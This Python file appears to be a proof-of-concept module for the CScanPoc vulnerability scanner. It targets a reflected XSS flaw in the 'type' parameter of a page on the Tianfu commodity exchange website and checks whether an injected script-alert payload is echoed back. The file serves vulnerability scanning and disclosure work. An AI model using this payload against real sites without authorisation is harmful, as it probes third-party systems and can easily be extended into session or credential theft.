# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Tianfu_0007' # 平台漏洞编号
    name = '天府商品交易所某处XSS' # 漏洞名称
    level = VulnLevel.LOW # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2016-07-08'  # 漏洞公布时间
    desc = '''
        天府商品交易所是经国务院部际联席会议验收，四川省人民政府批准，四川省、西藏自治区共建的大宗商品电子交易平台，是中国西部最大的大宗商品实货贸易的交易平台和衍生品场外交易的结算平台,
        其中type参数没有做任何过滤，可以直接在这些参数上插入script标签，造成XSS。
    ''' # 漏洞描述
    ref = 'Unknown' #https://wooyun.shuimugan.com/bug/view?bug_no=144135
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '天府交易所'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '7a7e6f94-9fa5-442a-ad6a-6c852326ac21' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-06' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/market1/show/stock/stock_page.jsp?type="><script>alert(/CScan/)</script>'
            response = requests.get(vul_url).content
            if '<script>alert(/CScan/)</script>' in response :
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
